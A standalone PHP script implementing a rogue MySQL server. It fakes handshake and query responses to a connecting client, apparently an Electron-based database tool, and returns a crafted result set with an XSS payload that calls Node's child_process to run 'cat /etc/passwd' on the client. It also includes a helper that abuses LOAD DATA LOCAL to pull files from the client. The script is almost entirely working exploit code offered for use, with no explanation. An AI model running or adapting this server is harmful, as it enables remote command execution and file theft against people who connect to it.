<?php 
error_reporting(0);
set_time_limit(0);
$address = "0.0.0.0";
$port = 3306;
$command = "cat /etc/passwd";



function hex($number){
	return base_convert($number,10,16);
}
$packet_1="0100000101";

$payload = sprintf("<img src=# onerror=\"require('child_process').exec('%s',(error, stdout, stderr)=>{alert(`stdout: \${stdout}`);});\">",$command);
$packet_2_2=[
	"catalog"=>"03646566",
	"database"=>"00",
	"table"=>"00",
	"original_table"=>"00",
	"name"=>hex(strlen($payload)).bin2hex($payload),
	"original_name"=>"000c",
	"charset_number"=>"e000",
	"length"=>"d4010000",
	"type"=>"fd",
	"flags"=>"0100",
	"decimals"=>"1f0000"
];
$packet_2_1=[
	"packet_length"=>hex(strlen(hex2bin(implode($packet_2_2))))."0000",
	"id"=>"02"
	];

$packet_2 = implode(array_merge($packet_2_1,$packet_2_2));
$packet_3 = "05000003fe00000200";
$packet_4_2 = [
		"length"=>hex(strlen($payload)),
		"text"=>bin2hex($payload)
]; 
$packet_4_1 = [
	"packet_length"=>hex(strlen(hex2bin(implode($packet_4_2))))."0000",
	"id"=>"04"
	];
$packet_4 = implode(array_merge($packet_4_1,$packet_4_2));
$packet_5 = "05000005fe00000200";
$attack_packet = hex2bin($packet_1.$packet_2.$packet_3.$packet_4.$packet_5);


define("GREETING","\x4a\x00\x00\x00\x0a\x35\x2e\x37\x2e\x32\x38\x00\x02\x00\x00\x00\x5c\x31\x01\x33\x7d\x09\x65\x7a\x00\xff\xff\xc0\x02\x00\xff\xc1\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x1b\x1c\x55\x27\x71\x59\x25\x3a\x2c\x6d\x2e\x2d\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00");
define("OK","\x07\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00");
define("LOGINSUCESS","\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00");
define("PID","\x01\x00\x00\x01\x01\x19\x00\x00\x02\x03\x64\x65\x66\x00\x00\x00\x03\x70\x69\x64\x00\x0c\x3f\x00\x15\x00\x00\x00\x08\xa1\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00\x02\x00\x00\x04\x01\x34\x05\x00\x00\x05\xfe\x00\x00\x02\x00");
define("VERSION","\x01\x00\x00\x01\x01\x17\x00\x00\x02\x03\x64\x65\x66\x00\x00\x00\x01\x76\x00\x0c\xe0\x00\x18\x00\x00\x00\xfd\x01\x00\x1f\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x02\x00\x07\x00\x00\x04\x06\x35\x2e\x37\x2e\x32\x38\x05\x00\x00\x05\xfe\x00\x00\x02\x00");
define("DBLIST","\x01\x00\x00\x01\x01\x4b\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x53\x43\x48\x45\x4d\x41\x54\x41\x08\x44\x61\x74\x61\x62\x61\x73\x65\x0b\x53\x43\x48\x45\x4d\x41\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x13\x00\x00\x04\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x00\x00\x05\x05\x6d\x79\x73\x71\x6c\x06\x00\x00\x06\x05\x70\x61\x70\x65\x72\x13\x00\x00\x07\x12\x70\x65\x72\x66\x6f\x72\x6d\x61\x6e\x63\x65\x5f\x73\x63\x68\x65\x6d\x61\x04\x00\x00\x08\x03\x73\x79\x73\x05\x00\x00\x09\xfe\x00\x00\x22\x00");
define("VARIABLES","\x01\x00\x00\x01\x02\x52\x00\x00\x02\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0d\x56\x61\x72\x69\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x0c\x2d\x00\x00\x01\x00\x00\xfd\x01\x10\x00\x00\x00\x42\x00\x00\x03\x03\x64\x65\x66\x00\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x11\x73\x65\x73\x73\x69\x6f\x6e\x5f\x76\x61\x72\x69\x61\x62\x6c\x65\x73\x05\x56\x61\x6c\x75\x65\x05\x56\x61\x6c\x75\x65\x0c\x2d\x00\x00\x10\x00\x00\xfd\x00\x00\x00\x00\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00\x1a\x00\x00\x05\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x66\x69\x6c\x65\x5f\x73\x79\x73\x74\x65\x6d\x02\x4f\x4e\x19\x00\x00\x06\x16\x6c\x6f\x77\x65\x72\x5f\x63\x61\x73\x65\x5f\x74\x61\x62\x6c\x65\x5f\x6e\x61\x6d\x65\x73\x01\x32\x05\x00\x00\x07\xfe\x00\x00\x22\x00");
define("ATTACK",$attack_packet);
define("TABLE","\x01\x00\x00\x01\x01\x42\x00\x00\x02\x03\x64\x65\x66\x12\x69\x6e\x66\x6f\x72\x6d\x61\x74\x69\x6f\x6e\x5f\x73\x63\x68\x65\x6d\x61\x06\x74\x61\x62\x6c\x65\x73\x06\x54\x41\x42\x4c\x45\x53\x04\x6e\x61\x6d\x65\x0a\x54\x41\x42\x4c\x45\x5f\x4e\x41\x4d\x45\x0c\xe0\x00\x00\x01\x00\x00\xfd\x01\x00\x00\x00\x00\x05\x00\x00\x03\xfe\x00\x00\x22\x00\x05\x00\x00\x04\xfe\x00\x00\x22\x00");
function initSocket($address,$port){
	$sock = socket_create(AF_INET, SOCK_STREAM, SOL_TCP) or die(socket_strerror(socket_last_error()));
	socket_set_block($sock) or die( socket_strerror(socket_last_error()));//阻塞模式
	$result = socket_bind($sock, $address, $port) or die(socket_strerror(socket_last_error()));//绑定端口
	$result = socket_listen($sock, 4) or die(socket_strerror(socket_last_error()));//开始监听
	echo "Listening:$address:$port\n";
	return $sock;
}
function closeSocket($sock){
	socket_close($sock);
}
function creatMessage($sock){
	$msgsock = socket_accept($sock);//or die( socket_strerror(socket_last_error()));
	return $msgsock;
}
function closeMessage($msgsock){
	socket_close($msgsock);
}
function readBuff($msgsock){
	try{
	$buf = socket_read($msgsock, 8192);
		return $buf;
	}catch (Exception $e) {
		echo $e->getMessage();
		return false;
	}
	
}
function sendBuff($msgsock,$msg){
	try{
		socket_write($msgsock, $msg, strlen($msg));
	}catch (Exception $e) {
		echo $e->getMessage();
	}
	
}

function getFile($msgsock,$fpath){
	$msg = chr(strlen($fpath)+1) . "\x00\x00\x01\xFB".$fpath;
	sendBuff($msgsock,$msg);
}
function checkPassword($content){
	if(strripos(bin2hex($content),"2632415c8cd5cb7500b7a8388b4d721816c2f5ac")){
		return true;
	}else{
		return false;
	}
}
function getUserIP($msgsock){
	socket_getpeername($msgsock, $addr, $por);
	return $addr;
}

$sock = initSocket($address,$port);
do{
	$msgsock = creatMessage($sock);
	echo sprintf("ClientIP:%s\n",getUserIP($msgsock));
	sendBuff($msgsock,GREETING);
	while($content = readBuff($msgsock)){
		if(preg_match("/0000000000000000000000000000000000000000000000(.*)0014[a-zA-Z0-9]{0,40}/is",bin2hex($content))){
				sendBuff($msgsock,LOGINSUCESS);
		}elseif (strripos($content,"SET NAMES utf8")) {
			sendBuff($msgsock,OK);
		}elseif(strripos($content,"SHOW VARIABLES")){
			sendBuff($msgsock,VARIABLES);
		}elseif(strripos($content,"SELECT connection_id() AS pid")){
			sendBuff($msgsock,PID);
		}elseif(strripos($content,"table_name")){
			sendBuff($msgsock,TABLE);
		}elseif(strripos($content,"SELECT")&&!strripos($content,"pid")&&!strripos($content,"version")&&!strripos($content,"table_name")){
			sendBuff($msgsock,ATTACK);
			closeMessage($msgsock);
		}elseif(strripos($content,"SHOW DATABASES")){
			sendBuff($msgsock,DBLIST);
			closeMessage($msgsock);
		}elseif(strripos($content,"SELECT VERSION() as v")){
			sendBuff($msgsock,VERSION);
		}else{
			sendBuff($msgsock,OK);
			closeMessage($msgsock);
		}
	}
	closeMessage($msgsock);
}while (1);

closeSocket($sock);
?>